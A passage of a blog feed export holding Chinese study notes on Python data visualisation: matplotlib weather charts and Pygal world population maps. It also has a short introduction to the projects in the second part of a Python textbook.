class="line">filename = <span class="string">'sitka_weather_2014.csv'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">    reader = csv.reader(f)</span><br><span class="line">    header_row = next(reader)</span><br><span class="line">    dates, highs = [], []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">        current_date = datetime.strptime(row[<span class="number">0</span>], <span class="string">"%Y-%m-%d"</span>)</span><br><span class="line">        dates.append(current_date)</span><br><span class="line">        high = int(row[<span class="number">1</span>])</span><br><span class="line">        highs.append(high)</span><br><span class="line">        <span class="comment"># 根据数据绘制图形</span></span><br><span class="line">fig = plt.figure(dpi=<span class="number">128</span>, figsize=(<span class="number">10</span>, <span class="number">6</span>))</span><br><span class="line">plt.plot(dates, highs, c=<span class="string">'red'</span>)</span><br><span class="line">    <span class="comment"># 设置图形的格式</span></span><br><span class="line">plt.title(<span class="string">"Daily high temperatures - 2014"</span>, fontsize=<span class="number">24</span>)</span><br><span class="line">plt.xlabel(<span class="string">''</span>, fontsize=<span class="number">16</span>)</span><br><span class="line">fig.autofmt_xdate()</span><br><span class="line">plt.ylabel(<span class="string">"Temperature (F)"</span>, fontsize=<span class="number">16</span>)</span><br><span class="line">plt.tick_params(axis=<span class="string">'both'</span>, which=<span class="string">'major'</span>, labelsize=<span class="number">16</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/23.png" alt=""></p><p><strong>再绘制一个数据系列</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># 从文件中获取日期、最高气温和最低气温</span></span><br><span class="line">filename = <span class="string">'sitka_weather_2014.csv'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">    reader = csv.reader(f)</span><br><span class="line">    header_row = next(reader)</span><br><span class="line">    dates, highs, lows = [], [], []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">        current_date = datetime.strptime(row[<span class="number">0</span>], <span class="string">"%Y-%m-%d"</span>)</span><br><span class="line">        dates.append(current_date)</span><br><span class="line">        high = int(row[<span class="number">1</span>])</span><br><span class="line">        highs.append(high)</span><br><span class="line">        low = int(row[<span class="number">3</span>])</span><br><span class="line">        lows.append(low)</span><br><span class="line"><span class="comment"># 根据数据绘制图形</span></span><br><span class="line">fig = plt.figure(dpi=<span class="number">128</span>, figsize=(<span class="number">10</span>, <span class="number">6</span>))</span><br><span class="line">plt.plot(dates, highs, c=<span class="string">'red'</span>)</span><br><span class="line">plt.plot(dates, lows, c=<span class="string">'blue'</span>)</span><br><span class="line"><span class="comment"># 设置图形的格式</span></span><br><span class="line">plt.title(<span class="string">"Daily high and low temperatures - 2014"</span>, fontsize=<span class="number">24</span>)</span><br><span class="line">plt.xlabel(<span class="string">''</span>, fontsize=<span class="number">16</span>)</span><br><span class="line">fig.autofmt_xdate()</span><br><span class="line">plt.ylabel(<span class="string">"Temperature (F)"</span>, fontsize=<span class="number">16</span>)</span><br><span class="line">plt.tick_params(axis=<span class="string">'both'</span>, which=<span class="string">'major'</span>, labelsize=<span class="number">16</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/24.png" alt=""></p><p><strong>给图表区域着色</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># 从文件中获取日期、最高气温和最低气温</span></span><br><span class="line">filename = <span class="string">'sitka_weather_2014.csv'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">    reader = csv.reader(f)</span><br><span class="line">    header_row = next(reader)</span><br><span class="line">    dates, highs, lows = [], [], []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">        current_date = datetime.strptime(row[<span class="number">0</span>], <span class="string">"%Y-%m-%d"</span>)</span><br><span class="line">        dates.append(current_date)</span><br><span class="line">        high = int(row[<span class="number">1</span>])</span><br><span class="line">        highs.append(high)</span><br><span class="line">        low = int(row[<span class="number">3</span>])</span><br><span class="line">        lows.append(low)</span><br><span class="line"><span class="comment"># 根据数据绘制图形</span></span><br><span class="line">fig = plt.figure(dpi=<span class="number">128</span>, figsize=(<span class="number">10</span>, <span class="number">6</span>))</span><br><span class="line">plt.plot(dates, highs, c=<span class="string">'red'</span>, alpha=<span class="number">0.5</span>)</span><br><span class="line">plt.plot(dates, lows, c=<span class="string">'blue'</span>, alpha=<span class="number">0.5</span>)</span><br><span class="line">plt.fill_between(dates, highs, lows, facecolor=<span class="string">'blue'</span>, alpha=<span class="number">0.1</span>)</span><br><span class="line"><span class="comment"># 设置图形的格式</span></span><br><span class="line">plt.title(<span class="string">"Daily high and low temperatures - 2014"</span>, fontsize=<span class="number">24</span>)</span><br><span class="line">plt.xlabel(<span class="string">''</span>, fontsize=<span class="number">16</span>)</span><br><span class="line">fig.autofmt_xdate()</span><br><span class="line">plt.ylabel(<span class="string">"Temperature (F)"</span>, fontsize=<span class="number">16</span>)</span><br><span class="line">plt.tick_params(axis=<span class="string">'both'</span>, which=<span class="string">'major'</span>, labelsize=<span class="number">16</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/25.png" alt=""></p><p><strong>错误检查</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># 从文件中获取日期、最高气温和最低气温</span></span><br><span class="line"><span class="comment"># 从文件中获取日期、最高气温和最低气温</span></span><br><span class="line">filename = <span class="string">'death_valley_2014.csv'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">    reader = csv.reader(f)</span><br><span class="line">    header_row = next(reader)</span><br><span class="line">    dates, highs, lows = [], [], []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            current_date = datetime.strptime(row[<span class="number">0</span>], <span class="string">"%Y-%m-%d"</span>)</span><br><span class="line">            high = int(row[<span class="number">1</span>])</span><br><span class="line">            low = int(row[<span class="number">3</span>])</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            print(current_date, <span class="string">'missing data'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dates.append(current_date)</span><br><span class="line">            highs.append(high)</span><br><span class="line">            lows.append(low)</span><br><span class="line"><span class="comment"># 根据数据绘制图形</span></span><br><span class="line">fig = plt.figure(dpi=<span class="number">128</span>, figsize=(<span class="number">10</span>, <span class="number">6</span>))</span><br><span class="line">plt.plot(dates, highs, c=<span class="string">'red'</span>, alpha=<span class="number">0.5</span>)</span><br><span class="line">plt.plot(dates, lows, c=<span class="string">'blue'</span>, alpha=<span class="number">0.5</span>)</span><br><span class="line">plt.fill_between(dates, highs, lows, facecolor=<span class="string">'blue'</span>, alpha=<span class="number">0.1</span>)</span><br><span class="line"><span class="comment"># 设置图形的格式</span></span><br><span class="line">title = <span class="string">"Daily high and low temperatures - 2014\nDeath Valley, CA"</span></span><br><span class="line">plt.title(title, fontsize=<span class="number">20</span>)</span><br><span class="line">plt.xlabel(<span class="string">''</span>, fontsize=<span class="number">16</span>)</span><br><span class="line">fig.autofmt_xdate()</span><br><span class="line">plt.ylabel(<span class="string">"Temperature (F)"</span>, fontsize=<span class="number">16</span>)</span><br><span class="line">plt.tick_params(axis=<span class="string">'both'</span>, which=<span class="string">'major'</span>, labelsize=<span class="number">16</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><code>2014-02-16 00:00:00 missing data</code></p><p><img src="/2018/11/26/Python-Learning-3/26.png" alt=""></p><p><strong>制作世界人口地图：JSON格式</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># 将数据加载到一个列表中</span></span><br><span class="line">filename = <span class="string">'population_data.json'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">    pop_data = json.load(f)</span><br><span class="line"><span class="comment"># 打印每个国家2010年的人口数量</span></span><br><span class="line"><span class="keyword">for</span> pop_dict <span class="keyword">in</span> pop_data:</span><br><span class="line">    <span class="keyword">if</span> pop_dict[<span class="string">'Year'</span>] == <span class="string">'2010'</span>:</span><br><span class="line">        country_name = pop_dict[<span class="string">'Country Name'</span>]</span><br><span class="line">        population = pop_dict[<span class="string">'Value'</span>]</span><br><span class="line">        print(country_name + <span class="string">": "</span> + population)</span><br></pre></td></tr></table></figure><p><code>Arab World: 357868000</code><br><code>Caribbean small states: 6880000</code><br><code>East Asia &amp; Pacific (all income levels): 2201536674</code><br><code>East Asia &amp; Pacific (developing only): 1961558757</code><br><code>Euro area: 331766000</code><br><code>Europe &amp; Central Asia (all income levels): 890424544</code><br><code>……</code></p><p><strong>将字符串转换为数字值</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># 将数据加载到一个列表中</span></span><br><span class="line">filename = <span class="string">'population_data.json'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">    pop_data = json.load(f)</span><br><span class="line"><span class="comment"># 打印每个国家2010年的人口数量</span></span><br><span class="line"><span class="keyword">for</span> pop_dict <span class="keyword">in</span> pop_data:</span><br><span class="line">    <span class="keyword">if</span> pop_dict[<span class="string">'Year'</span>] == <span class="string">'2010'</span>:</span><br><span class="line">        country_name = pop_dict[<span class="string">'Country Name'</span>]</span><br><span class="line">        population = int(float(pop_dict[<span class="string">'Value'</span>]))</span><br><span class="line">        print(country_name + <span class="string">": "</span> + str(population))</span><br></pre></td></tr></table></figure><p><code>Arab World: 357868000</code><br><code>Caribbean small states: 6880000</code><br><code>East Asia &amp; Pacific (all income levels): 2201536674</code><br><code>East Asia &amp; Pacific (developing only): 1961558757</code><br><code>Euro area: 331766000</code><br><code>Europe &amp; Central Asia (all income levels): 890424544</code><br><code>……</code></p><p><strong>获取两个字母的国别码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pygal_maps_world.i18n <span class="keyword">import</span> COUNTRIES</span><br><span class="line"><span class="keyword">for</span> country_code <span class="keyword">in</span> sorted(COUNTRIES.keys()):</span><br><span class="line">    print(country_code, COUNTRIES[country_code])</span><br></pre></td></tr></table></figure><p><code>ad Andorra</code><br><code>ae United Arab Emirates</code><br><code>af Afghanistan</code><br><code>al Albania</code><br><code>am Armenia</code><br><code>ao Angola</code><br><code>aq Antarctica</code><br><code>ar Argentina</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pygal_maps_world.i18n <span class="keyword">import</span> COUNTRIES</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_country_code</span><span class="params">(country_name)</span>:</span></span><br><span class="line">    <span class="string">"""根据指定的国家，返回Pygal使用的两个字母的国别码"""</span></span><br><span class="line">    <span class="keyword">for</span> code, name <span class="keyword">in</span> COUNTRIES.items():</span><br><span class="line">        <span class="keyword">if</span> name == country_name:</span><br><span class="line">            <span class="keyword">return</span> code</span><br><span class="line"><span class="comment"># 如果没有找到指定的国家，就返回None</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">print(get_country_code(<span class="string">'Andorra'</span>))</span><br><span class="line">print(get_country_code(<span class="string">'United Arab Emirates'</span>))</span><br><span class="line">print(get_country_code(<span class="string">'Afghanistan'</span>))</span><br></pre></td></tr></table></figure><p><code>ad</code><br><code>ae</code><br><code>af</code></p><p><strong>制作世界地图</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygal_maps_world.maps</span><br><span class="line">wm = pygal_maps_world.maps.World()</span><br><span class="line">wm.title = <span class="string">'North, Central, and South America'</span></span><br><span class="line">wm.add(<span class="string">'North America'</span>, [<span class="string">'ca'</span>, <span class="string">'mx'</span>, <span class="string">'us'</span>])</span><br><span class="line">wm.add(<span class="string">'Central America'</span>, [<span class="string">'bz'</span>, <span class="string">'cr'</span>, <span class="string">'gt'</span>, <span class="string">'hn'</span>, <span class="string">'ni'</span>, <span class="string">'pa'</span>, <span class="string">'sv'</span>])</span><br><span class="line">wm.add(<span class="string">'South America'</span>, [<span class="string">'ar'</span>, <span class="string">'bo'</span>, <span class="string">'br'</span>, <span class="string">'cl'</span>, <span class="string">'co'</span>, <span class="string">'ec'</span>, <span class="string">'gf'</span>,</span><br><span class="line"><span class="string">'gy'</span>, <span class="string">'pe'</span>, <span class="string">'py'</span>, <span class="string">'sr'</span>, <span class="string">'uy'</span>, <span class="string">'ve'</span>])</span><br><span class="line">wm.render_to_file(<span class="string">'americas.svg'</span>)</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/27.png" alt=""></p><p><strong>在世界地图上呈现数字数据</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygal</span><br><span class="line">wm = pygal_maps_world.maps.World()</span><br><span class="line">wm.title = <span class="string">'Populations of Countries in North America'</span></span><br><span class="line">wm.add(<span class="string">'North America'</span>, &#123;<span class="string">'ca'</span>: <span class="number">34126000</span>, <span class="string">'us'</span>: <span class="number">309349000</span>, <span class="string">'mx'</span>: <span class="number">113423000</span>&#125;)</span><br><span class="line">wm.render_to_file(<span class="string">'na_populations.svg'</span>)</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/28.png" alt=""></p><p><strong>绘制完整的世界人口地图</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pygal</span><br><span class="line"><span class="keyword">from</span> country_codes <span class="keyword">import</span> get_country_code</span><br><span class="line"><span class="comment"># 将数据加载到列表中</span></span><br><span class="line">filename = <span class="string">'population_data.json'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">    pop_data = json.load(f)</span><br><span class="line"><span class="comment"># 创建一个包含人口数量的字典</span></span><br><span class="line">cc_populations = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> pop_dict <span class="keyword">in</span> pop_data:</span><br><span class="line">    <span class="keyword">if</span> pop_dict[<span class="string">'Year'</span>] == <span class="string">'2010'</span>:</span><br><span class="line">        country = pop_dict[<span class="string">'Country Name'</span>]</span><br><span class="line">        population = int(float(pop_dict[<span class="string">'Value'</span>]))</span><br><span class="line">        code = get_country_code(country)</span><br><span class="line">        <span class="keyword">if</span> code:</span><br><span class="line">            cc_populations[code] = population</span><br><span class="line">wm = pygal_maps_world.maps.World()</span><br><span class="line">wm.title = <span class="string">'World Population in 2010, by Country'</span></span><br><span class="line">wm.add(<span class="string">'2010'</span>, cc_populations)</span><br><span class="line">wm.render_to_file(<span class="string">'world_population.svg'</span>)</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/29.png" alt=""></p><p><strong>根据人口数量将国家分组</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pygal</span><br><span class="line"><span class="keyword">from</span> country_codes <span class="keyword">import</span> get_country_code</span><br><span class="line"><span class="comment"># 将数据加载到列表中</span></span><br><span class="line">filename = <span class="string">'population_data.json'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">    pop_data = json.load(f)</span><br><span class="line"><span class="comment"># 创建一个包含人口数量的字典</span></span><br><span class="line">cc_populations = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> pop_dict <span class="keyword">in</span> pop_data:</span><br><span class="line">    <span class="keyword">if</span> pop_dict[<span class="string">'Year'</span>] == <span class="string">'2010'</span>:</span><br><span class="line">        country = pop_dict[<span class="string">'Country Name'</span>]</span><br><span class="line">        population = int(float(pop_dict[<span class="string">'Value'</span>]))</span><br><span class="line">        code = get_country_code(country)</span><br><span class="line">        <span class="keyword">if</span> code:</span><br><span class="line">            cc_populations[code] = population</span><br><span class="line"><span class="comment"># 根据人口数量将所有的国家分成三组</span></span><br><span class="line">cc_pops_1, cc_pops_2, cc_pops_3 = &#123;&#125;, &#123;&#125;, &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> cc, pop <span class="keyword">in</span> cc_populations.items():</span><br><span class="line">    <span class="keyword">if</span> pop &lt; <span class="number">10000000</span>:</span><br><span class="line">        cc_pops_1[cc] = pop</span><br><span class="line">    <span class="keyword">elif</span> pop &lt; <span class="number">1000000000</span>:</span><br><span class="line">        cc_pops_2[cc] = pop</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cc_pops_3[cc] = pop</span><br><span class="line"><span class="comment"># 看看每组分别包含多少个国家</span></span><br><span class="line">print(len(cc_pops_1), len(cc_pops_2), len(cc_pops_3))</span><br><span class="line">wm = pygal_maps_world.maps.World()</span><br><span class="line">wm.title = <span class="string">'World Population in 2010, by Country'</span></span><br><span class="line">wm.add(<span class="string">'0-10m'</span>, cc_pops_1)</span><br><span class="line">wm.add(<span class="string">'10m-1bn'</span>, cc_pops_2)</span><br><span class="line">wm.add(<span class="string">'&gt;1bn'</span>, cc_pops_3)</span><br><span class="line">wm.render_to_file(<span class="string">'world_population.svg'</span>)</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/26/Python-Learning-3/30.png" alt=""></p><p><strong>使用Pygal设置世界地图的样式</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pygal</span><br><span class="line"><span class="keyword">from</span> country_codes <span class="keyword">import</span> get_country_code</span><br><span class="line"><span class="keyword">from</span> pygal.style <span class="keyword">import</span> RotateStyle</span><br><span class="line"><span class="comment"># 将数据加载到列表中</span></span><br><span class="line">filename = <span class="string">'population_data.json'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">    pop_data = json.load(f)</span><br><span class="line"><span class="comment"># 创建一个包含人口数量的字典</span></span><br><span class="line">cc_populations = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> pop_dict <span class="keyword">in</span> pop_data:</span><br><span class="line">    <span class="keyword">if</span> pop_dict[<span class="string">'Year'</span>] == <span class="string">'2010'</span>:</span><br><span class="line">        country = pop_dict[<span class="string">'Country Name'</span>]</span><br><span class="line">        population = int(float(pop_dict[<span class="string">'Value'</span>]))</span><br><span class="line">        code = get_country_code(country)</span><br><span class="line">        <span class="keyword">if</span> code:</span><br><span class="line">            cc_populations[code] = population</span><br><span class="line"><span class="comment"># 根据人口数量将所有的国家分成三组</span></span><br><span class="line">cc_pops_1, cc_pops_2, cc_pops_3 = &#123;&#125;, &#123;&#125;, &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> cc, pop <span class="keyword">in</span> cc_populations.items():</span><br><span class="line">    <span class="keyword">if</span> pop &lt; <span class="number">10000000</span>:</span><br><span class="line">        cc_pops_1[cc] = pop</span><br><span class="line">    <span class="keyword">elif</span> pop &lt; <span class="number">1000000000</span>:</span><br><span class="line">        cc_pops_2[cc] = pop</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cc_pops_3[cc] = pop</span><br><span class="line"><span class="comment"># 看看每组分别包含多少个国家</span></span><br><span class="line">print(len(cc_pops_1), len(cc_pops_2), len(cc_pops_3))</span><br><span class="line">wm_style = RotateStyle(<span class="string">'#336699'</span>)</span><br><span class="line">wm = pygal_maps_world.maps.World(style=wm_style)</span><br><span class="line">wm.title = <span class="string">'World Population in 2010, by Country'</span></span><br><span class="line">wm.add(<span class="string">'0-10m'</span>, cc_pops_1)</span><br><span class="line">wm.add(<span class="string">'10m-1bn'</span>, cc_pops_2)</span><br><span class="line">wm.add(<span class="string">'&gt;1bn'</span>, cc_pops_3)</span><br><span class="line">wm.render_to_file(<span class="string">'world_population.svg'</span>)</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/26/Python-Learning-3/31.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python-Learning-2</title>
      <link href="/2018/11/21/Python-Learning-2/"/>
      <url>/2018/11/21/Python-Learning-2/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>《Python编程从入门到实践》——【美】Eric Matthes 著 袁国忠 译</p><p>由于Python2已经停止更新，所以尽量用Python3开始编程。</p><p>这是第二部分</p><a id="more"></a><p>第二部分包含三个不同类型的项目，你可以选择完成其中的任何项目或全部项目，完成这些项目的顺序无关紧要。下面简要地描述每个项目，帮助你决定首先去完成哪个项目。<br><strong>外星人入侵：使用 Python 开发游戏</strong><br>在项目“外星人入侵”（第 12~14 章）中，你将使用 Pygame 包来开发一款 2D 游戏，它在玩家每消灭一群向下移动的外星人后，都将玩家提高一个等级；而等级越高，游戏的节奏<br>越快，难度越大。完成这个项目后，你将获得自己动手使用 Pygame 开发 2D 游戏所需的技能。<br><strong>数据可视化</strong><br>“数据可视化”项目始于第 15 章，在这一章中，你将学习如何使用 matplotlib 和 Pygal 来生成数据，以及根据这些数据创建实用而漂亮的图表。第 16 章介绍如何从网上获取数据，并将它们提供给可视化包以创建天气图和世界人口地图。最后，第 17 章介绍如何编写自动下载数据并对其进行可视化的程序。学习可视化让你可以探索数据挖掘领域，这是当前在全球都非常吃香的技能。<br><strong>Web 应用程序</strong><br>在“Web 应用程序”项目（第 18~20 章）中，你将使用 Django 包来创建一个简单的 Web 应用程序，它让用户能够记录任意多个一直在学习的主题。用户将通过指定用户名和密码来创建账户，输入主题，并编写条目来记录学习的内容。你还将学习如何部署应用程序，让世界上的任何人都能够访问它。<br>完成这个项目后，你将能够自己动手创建简单的 Web 应用程序，并能够深入学习其他有关如何使用 Django 开发应用程序的资料。</p><h2 id="项目一-外星人入侵"><a href="#项目一-外星人入侵" class="headerlink" title="项目一 外星人入侵"></a>项目一 外星人入侵</h2><h2 id="武装飞船"><a href="#武装飞船" class="headerlink" title="武装飞船"></a>武装飞船</h2><p><strong>开始游戏项目</strong></p><p>P117页</p>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Essay </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>从汇编语言到Windows内核编程</title>
      <link href="/2018/11/20/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%88%B0Windows%E5%86%85%E6%A0%B8%E7%BC%96%E7%A8%8B/"/>
      <url>/2018/11/20/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%88%B0Windows%E5%86%85%E6%A0%B8%E7%BC%96%E7%A8%8B/</url>
